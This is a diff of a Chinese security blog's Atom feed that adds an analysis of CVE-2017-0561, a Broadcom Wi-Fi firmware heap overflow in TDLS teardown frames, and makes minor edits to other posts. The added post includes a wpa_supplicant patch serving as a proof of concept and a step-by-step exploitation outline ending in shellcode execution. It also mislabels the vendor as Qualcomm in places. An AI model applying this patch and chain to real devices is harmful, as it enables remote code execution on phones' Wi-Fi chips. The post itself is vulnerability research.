@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-04-19T09:13:44.000Z</updated>
+  <updated>2017-04-27T03:15:40.000Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,96 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2017-0561高通wifi-soc的RCE攻击案例</title>
+    <link href="http://yoursite.com/2017/04/27/CVE-2017-0561-%E9%AB%98%E9%80%9Awifi-soc%E7%9A%84RCE%E6%94%BB%E5%87%BB%E6%A1%88%E4%BE%8B/"/>
+    <id>http://yoursite.com/2017/04/27/CVE-2017-0561-高通wifi-soc的RCE攻击案例/</id>
+    <published>2017-04-27T02:40:57.000Z</published>
+    <updated>2017-04-27T03:15:40.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
+<hr>
+<p>Title: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1046" target="_blank" rel="external">CVE-2017-0561 issues</a></p>
+<p>Core Skill：远程攻击 wpa_supplicant wifi 模块, 存在堆溢出漏洞,精心构造数据可以远程提权。</p>
+<a id="more"></a>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>漏洞在高通的 BCM 固件中。当网络中有设备发送 wifi TDLS teardow请求时，网络中的设备会自动接受请求包，然后校验teardown 请求包。</p>
+<p>MIG ：message integrity code  消息完整性代码<br>首先要建立 TDLS 连接，当其中一台设备发送 teardown 请求时，另一方会自动接收</p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>校验完成以后，在处理请求包之前会校验MIC，调用wlc_tdls_cal_teardown_mic_chk函数。<br>伪代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">void *wlc_tdls_cal_teardown_mic_chk() &#123;</div><div class="line">uint8_t* buffer = malloc(256);</div><div class="line">...</div><div class="line">uint8_t* linkid_ie = bcm_parse_tlvs(..., 101);</div><div class="line">memcpy(buffer, linkid_ie, 0x14);</div><div class="line">...</div><div class="line">uint8_t* ft_ie = bcm_parse_tlvs(..., 55);       // 提取Fast Transition IE （55）信息元素</div><div class="line">memcpy(buf + 0x18, ft_ie, ft_ie[1] + 2);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>因为在拷贝 FTIE 之前没有校验数据报中 FTIE 的长度，所以在 memcpy 时会导致堆溢出。</p>
+<h1 id="POC-使用步骤："><a href="#POC-使用步骤：" class="headerlink" title="POC 使用步骤："></a>POC 使用步骤：</h1><ol>
+<li>需要下载  wpa_supplicant 2.6</li>
+<li>安装补丁文件？》？》？</li>
+<li>编译 wpa_supplicant （支持 TDLS）</li>
+<li>使用 wpa_supplicant 链接到网路 </li>
+<li>链接 到 wpa_cli:    要攻击的设备？？<pre><code>1. 使用 &quot;TDLS_SETUP   &lt;MAC_ADDRESS_OF_PEER&gt;”设置到BCM对等体的TDLS连接
+2. 使用“TDLS_TEARDOWN &lt;MAC_ADDRESS_OF_PEER&gt;”拆除连接
+</code></pre>(其中MAC_ADDRESS_OF_PEER是具有与同一网络相关联的BCM SoC的对等体的MAC地址）</li>
+</ol>
+<h2 id="Patch-文件"><a href="#Patch-文件" class="headerlink" title="Patch 文件"></a>Patch 文件</h2><p>这份 patch 文件 就是一个 poc, 通过修改 wpa_supplicant 代码，在构造 teardown 请求包时，故意让 ftie 指向的堆比接受的256 字节大。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">--- wpa_supplicant-2.6/src/rsn_supp/tdls.c     2016-10-02 19:51:11.000000000 +0100</div><div class="line">+++ TDLSTeardownModification/wpa_supplicant-2.6/src/rsn_supp/tdls.c     2016-12-19 12:15:28.000000000 +0000</div><div class="line">@@ -765,15 +765,7 @@</div><div class="line">     wpa_printf(MSG_DEBUG, &quot;TDLS: TDLS Teardown for &quot; MACSTR,</div><div class="line">             MAC2STR(addr));</div><div class="line"></div><div class="line">// 删除计算 ielen 的代码， 这里是用来计算 ftie 堆的大小</div><div class="line">-     ielen = 0;</div><div class="line">-     if (wpa_tdls_get_privacy(sm) &amp;&amp; peer-&gt;tpk_set &amp;&amp; peer-&gt;tpk_success) &#123;</div><div class="line">-          /* To add FTIE for Teardown request and compute MIC */</div><div class="line">-          ielen += sizeof(*ftie);</div><div class="line">-#ifdef CONFIG_TDLS_TESTING</div><div class="line">-          if (tdls_testing &amp; TDLS_TESTING_LONG_FRAME)</div><div class="line">-               ielen += 170;</div><div class="line">-#endif /* CONFIG_TDLS_TESTING */</div><div class="line">-     &#125;</div><div class="line">+     ielen = 257;        // 溢出1个字节</div><div class="line"></div><div class="line">     rbuf = os_zalloc(ielen + 1);</div><div class="line">     if (rbuf == NULL)</div><div class="line">@@ -785,11 +777,14 @@</div><div class="line"></div><div class="line">     ftie = (struct wpa_tdls_ftie *) pos;</div><div class="line">     ftie-&gt;ie_type = WLAN_EID_FAST_BSS_TRANSITION;</div><div class="line">+     ftie-&gt;ie_len = 255;            // 忽略了 wpa_tdls_ftie 头部2个字节。实际在计算 mic 时，读取的是 257 个字节。</div><div class="line">+     os_memset(pos + 2, 0xFF, 255);</div><div class="line">+</div><div class="line">     /* Using the recent nonce which should be for CONFIRM frame */</div><div class="line">     os_memcpy(ftie-&gt;Anonce, peer-&gt;rnonce, WPA_NONCE_LEN);</div><div class="line">     os_memcpy(ftie-&gt;Snonce, peer-&gt;inonce, WPA_NONCE_LEN);</div><div class="line">-     ftie-&gt;ie_len = sizeof(struct wpa_tdls_ftie) - 2;</div><div class="line">-     pos = (u8 *) (ftie + 1);</div><div class="line">+</div><div class="line">+     pos += 257;</div><div class="line">#ifdef CONFIG_TDLS_TESTING</div><div class="line">     if (tdls_testing &amp; TDLS_TESTING_LONG_FRAME) &#123;</div><div class="line">          wpa_printf(MSG_DEBUG, &quot;TDLS: Testing - add extra subelem to &quot;</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">struct wpa_tdls_ftie &#123;</div><div class="line">     u8 ie_type; /* FTIE */</div><div class="line">     u8 ie_len;        // 这里会 忽略头2个字节</div><div class="line">     u8 mic_ctrl[2];</div><div class="line">     u8 mic[TDLS_MIC_LEN];  //TDLS_MIC_LEN  16</div><div class="line">     u8 Anonce[WPA_NONCE_LEN]; /* Responder Nonce in TDLS */   WPA_NONCE_LEN 32</div><div class="line">     u8 Snonce[WPA_NONCE_LEN]; /* Initiator Nonce in TDLS */</div><div class="line">     /* followed by optional elements */</div><div class="line">&#125; STRUCT_PACKED;</div></pre></td></tr></table></figure>
+<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>我已经能够在BCM4339芯片上验证此漏洞，运行版本为6.37.34.40（如Nexus 5所示）。不过，我相信这个漏洞的范围包括更广泛的Broadcom SoC和版本。</p>
+<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><p>直接 运行exploit.py  可以在 WiFi  加密狗上 任意代码执行。</p>
+<p>配置步骤：</p>
+<ol>
+<li>和目标设备创建 TDLS 链接</li>
+<li>发送构造的 teardown 请求给目标，触发堆溢出漏洞</li>
+<li>创建一个新的 TDLS 链接，使用精心设计的参数，导致空闲链表中的一个chunk覆盖另一个chunk ？？？</li>
+<li>发送 action code == 127 的 TDLS 请求帧<ol>
+<li>精心构造 TDLS 请求帧的大小，要让其和空闲链表中另一个 chunk 发生覆盖</li>
+<li>精心构造 请求数据，保证 free chunk 的指针指向，固件初始化时创建的定时器</li>
+</ol>
+</li>
+<li>发送另一个 action code == 127 的 TDLS 请求帧<ol>
+<li>精心构造 TDLS 请求帧的大小，这个帧将被放置在 定时器的头部 （因为再次 malloc 时，返回的是定时器的内存地址）</li>
+<li>精心构造 请求数据，保证我们能覆盖定时器的函数指针，这里我们将指针指向堆结尾处。</li>
+</ol>
+</li>
+<li>发送一个 action code == 127 的较大 TDLS 请求帧<ol>
+<li>精心构造 请求数据，使其包含我们要执行的 shellcode</li>
+</ol>
+</li>
+<li>由于堆内存分配以后都会被初始化为0， 而“Thumb”中为“00 00”为NOP（MOVS R0，R0），这就是天然的滑板指令。所以我们跳到shellcode 之前的位置，不会有任何影响。<br>整个攻击，会在下一次定时器到期，在固件上执行我们的 shellcode。</li>
+</ol>
+<!--
+### 好消息
+因为 高通生产的 wifi soc 可以独立处理 物理层和链路层的工作，不需要 OS 参与。所以在单独的芯片上不会受到 SMEP、PXN、NX 等防护措施的影响。可以在堆上执行 shellcode。
+-->
+<h3 id="ChangeLog"><a href="#ChangeLog" class="headerlink" title="ChangeLog"></a>ChangeLog</h3><table>
+<thead>
+<tr>
+<th>Time</th>
+<th>Change</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2017-4-21</td>
+<td>测试 android N5</td>
+</tr>
+<tr>
+<td></td>
+<td>测试 ios &lt;=10.3</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Title: &lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=1046&quot;&gt;CVE-2017-0561 issues&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Core Skill：远程攻击 wpa_supplicant wifi 模块, 存在堆溢出漏洞,精心构造数据可以远程提权。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
+    
+    
+      <category term="pi" scheme="http://yoursite.com/tags/pi/"/>
+    
+  </entry>
   
   <entry>
     <title>《三体》</title>
@@ -51,7 +141,7 @@
     <link href="http://yoursite.com/2017/04/19/%E7%8E%A9%E8%BD%AC-android-%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
     <id>http://yoursite.com/2017/04/19/玩转-android-虚拟机/</id>
     <published>2017-04-19T07:38:47.000Z</published>
-    <updated>2017-04-19T07:51:08.000Z</updated>
+    <updated>2017-04-27T03:19:20.000Z</updated>
     
     <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
 <hr>
@@ -164,7 +254,7 @@
     <link href="http://yoursite.com/2017/04/10/Andorid-%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%AF%81%E4%B9%A6/"/>
     <id>http://yoursite.com/2017/04/10/Andorid-添加系统证书/</id>
     <published>2017-04-10T09:45:01.000Z</published>
-    <updated>2017-04-10T11:16:40.000Z</updated>
+    <updated>2017-04-27T03:19:20.000Z</updated>
     
     <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
 <hr>
@@ -301,14 +391,14 @@
 </li>
 </ul>
 <p>还支持上面介绍的 对象类型.<br><strong>注意</strong>：JAVA语言并区分整数类型与浮点类型。JavaScript 中的数值均使用浮点值来表示。同时，按照 IEEE754 标准，JavaScript 用64位浮点格式来表示数。</p>
-<p>在 JavaScript 编程过程中，必须先声明一个变量，这个变量才能被使用。<br>此外，变量是通过 “var” 来声明的，例子如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line">    &lt;!--</div><div class="line">    var money, type;</div><div class="line">    var name;</div><div class="line">    name = "Ali";</div><div class="line">    //--&gt;</div><div class="line">&lt;\/script&gt;</div></pre></td></tr></table></figure></p>
+<p>在 JavaScript 编程过程中，必须先声明一个变量，这个变量才能被使用。<br>此外，变量是通过 “var” 来声明的，例子如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line">    <span class="xml"><span class="comment">&lt;!--</span></span></div><div class="line">    var money, type;</div><div class="line">    var name;</div><div class="line">    name = "Ali";</div><div class="line">    //--&gt;</div><div class="line"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <p>JavaScript 是一种无类型语言。这就是说， JavaScript 变量可以存储任何类型的值。与其他语言不同的是，我们不需要在变量声明阶段告诉变量其要存储的数据类型是什么。</p>
 <p><strong>JavaScript变量作用域</strong></p>
 <ul>
 <li>全局变量：全局变量具有全部整体范围的作用域，这意味着它可以在 JavaScript 代码任何地方定义。</li>
 <li>局部变量：局部变量仅在定义它的函数体内可以访问到。函数参数对于函数来说就是局部变量。</li>
 </ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line">    &lt;!--</div><div class="line">    var myVar = "global"; // Declare a global variable</div><div class="line">    function checkscope( ) &#123;</div><div class="line">       var myVar = "local";  // Declare a local variable</div><div class="line">       document.write(myVar);</div><div class="line">    &#125;</div><div class="line">    //--&gt;</div><div class="line">&lt;\/script&gt;</div><div class="line"></div><div class="line"><span class="comment">// 输出：</span></div><div class="line"><span class="comment">//      Local</span></div></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line">    <span class="xml"><span class="comment">&lt;!--</span></span></div><div class="line">    var myVar = "global"; // Declare a global variable</div><div class="line">    function checkscope( ) &#123;</div><div class="line">       var myVar = "local";  // Declare a local variable</div><div class="line">       document.write(myVar);</div><div class="line">    &#125;</div><div class="line">    //--&gt;</div><div class="line"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">// 输出：</span></div><div class="line"><span class="comment">//      Local</span></div></pre></td></tr></table></figure>
 <p><strong>JavaScript 保留的关键字</strong></p>
 <table>
 <thead>
@@ -419,7 +509,7 @@
 <li><p>‘&gt;&gt;&gt;’ 称为0补最高位无符号右移运算符。这个运算符与&gt;&gt;运算符相像，除了位移后左边总是补0.  A &gt;&gt;&gt; = 1.</p>
 </li>
 </ul>
-<h4 id="4-函数"><a href="#4-函数" class="headerlink" title="4.函数"></a>4.函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">* 定义函数：</div><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line">    &lt;!--</div><div class="line">    function functionname(parameter-list)</div><div class="line">    &#123;</div><div class="line">        statements</div><div class="line">    &#125;</div><div class="line">    //--&gt;</div><div class="line">&lt;\/script&gt;</div></pre></td></tr></table></figure>
+<h4 id="4-函数"><a href="#4-函数" class="headerlink" title="4.函数"></a>4.函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">* 定义函数：</div><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line">    <span class="xml"><span class="comment">&lt;!--</span></span></div><div class="line">    function functionname(parameter-list)</div><div class="line">    &#123;</div><div class="line">        statements</div><div class="line">    &#125;</div><div class="line">    //--&gt;</div><div class="line"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></div></pre></td></tr></table></figure>
 <blockquote>
 <p>知识的搬运工今天都当到这里，剩下的就是 Coding</p>
 </blockquote>
@@ -503,7 +593,7 @@
     <link href="http://yoursite.com/2017/03/20/java-ArrayList-String-add-%E7%94%A8%E6%B3%95%E8%AF%B4%E6%98%8E/"/>
     <id>http://yoursite.com/2017/03/20/java-ArrayList-String-add-用法说明/</id>
     <published>2017-03-20T06:03:15.000Z</published>
-    <updated>2017-03-20T06:50:47.000Z</updated>
+    <updated>2017-04-27T03:19:20.000Z</updated>
     
     <content type="html"><![CDATA[<p>转载自：<a href="https://my.oschina.net/nullObject/blog/181802?p=1" target="_blank" rel="external">https://my.oschina.net/nullObject/blog/181802?p=1</a></p>
 <hr>
@@ -704,9 +794,9 @@
       <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
     
     
-      <category term="kext" scheme="http://yoursite.com/tags/kext/"/>
-    
       <category term="xnu" scheme="http://yoursite.com/tags/xnu/"/>
+    
+      <category term="kext" scheme="http://yoursite.com/tags/kext/"/>
     
       <category term="c" scheme="http://yoursite.com/tags/c/"/>
     
@@ -1910,71 +2000,6 @@ fptr_offset : __cleanup 相对 fptr_page 的偏移
     
       <category term="生活" scheme="http://yoursite.com/categories/categories-life/"/>
     
-    
-  </entry>
-  
-  <entry>
-    <title>jeb-v2.2.7真机调试 APK(nodebug)</title>
-    <link href="http://yoursite.com/2017/01/24/jeb-v2-2-7%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95-APK-nodebug/"/>
-    <id>http://yoursite.com/2017/01/24/jeb-v2-2-7真机调试-APK-nodebug/</id>
-    <published>2017-01-23T16:31:49.000Z</published>
-    <updated>2017-03-09T16:28:23.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
-<hr>
-<p>记录 在动态调试 app 中 gif库解析漏洞是使用的工具 和 遇到的一些坑， 分析漏洞只是顺带一提不作为重点。</p>
-<a id="more"></a>
-<h2 id="JEB2-2-7-调试阿里2016移动安全-第三题-app部分"><a href="#JEB2-2-7-调试阿里2016移动安全-第三题-app部分" class="headerlink" title="JEB2.2.7 调试阿里2016移动安全 第三题-app部分"></a>JEB2.2.7 调试阿里2016移动安全 第三题-app部分</h2><blockquote>
-<p>说明：</p>
-<pre><code>1. app debugable 开关关闭。我采用刷ROM(userdebug 版本)的方式绕过。
-2. 测试手机: Nexus 5x
-3. Android 版本: 6.0.1
-</code></pre></blockquote>
-<script>
-    if( prompt("Please input password") !== String(111) )
-    {
-        alert('密码错误！');
-        self.location='https://floatingguy.github.io/about/';
-        // history.back();
-    } else {
-        alert("密码正确");
-    }
-</script>
-
-<hr>
-<p>工具：jeb-v2.2.7<br>需要配置的环境变量：JEB_HOME 和 ANDROID_SDK。</p>
-<h3 id="bug-统计"><a href="#bug-统计" class="headerlink" title="bug 统计"></a>bug 统计</h3><ol>
-<li>jeb动态调试BUG:<br> ANDROID_SDK配置完全正确，但是每次 debug 时都显示<code>找不到 ADB</code>。</li>
-</ol>
-<p>原因：我是通过Alfred 通过开启的 jeb.app， 这种方式访问不到环境变量所以找不到 ADB。<br>解决：</p>
-<pre><code>1. 可以通过写脚本，每次在终端执行  （完成 jeb_debug...sh）
-2. 到 jeb目录下执行 jeb_mac.sh
-</code></pre><h3 id="jeb注意事项："><a href="#jeb注意事项：" class="headerlink" title="jeb注意事项："></a>jeb注意事项：</h3><pre><code>1. 只有在 bytecode view时才可以 debug
-2. 视频中可以从 art 指令直接跳转到 so汇编中执行，但是我本次测试时不行。。。
-3. localval 窗口显示的只有 数字没有字符不知道怎么对应。
-</code></pre><h3 id="jeb-快捷键："><a href="#jeb-快捷键：" class="headerlink" title="jeb 快捷键："></a>jeb 快捷键：</h3><pre><code>* 下断点：cmd+B
-* 反编译：q
-* 后退/前进： alt+ ←/→
-</code></pre><h2 id="题目注意事项"><a href="#题目注意事项" class="headerlink" title="题目注意事项"></a>题目注意事项</h2><p>在上传 gif 解析时，app中将 URL 强制从<code>URLConnection</code>转换成了 <code>HTTPURLConnection</code>类型，所以我们json文件中的<code>address</code>值必须包含<code>http://</code>否则会抛出<code>MalformedURLException</code>异常</p>
-<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.pnfsoftware.com/blog/jeb-android-debuggers/" target="_blank" rel="external">AN INTRODUCTION TO JEB ANDROID DEBUGGERS</a><br><a href="https://www.pnfsoftware.com/blog/category/jeb2/" target="_blank" rel="external">ADVANCED DEBUGGER USAGE VIA THE INTERPRETER</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;记录 在动态调试 app 中 gif库解析漏洞是使用的工具 和 遇到的一些坑， 分析漏洞只是顺带一提不作为重点。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
-    
-    
-      <category term="jeb" scheme="http://yoursite.com/tags/jeb/"/>
-    
-      <category term="动态调试" scheme="http://yoursite.com/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
-    
-      <category term="Armv8-64" scheme="http://yoursite.com/tags/Armv8-64/"/>
     
   </entry>
   
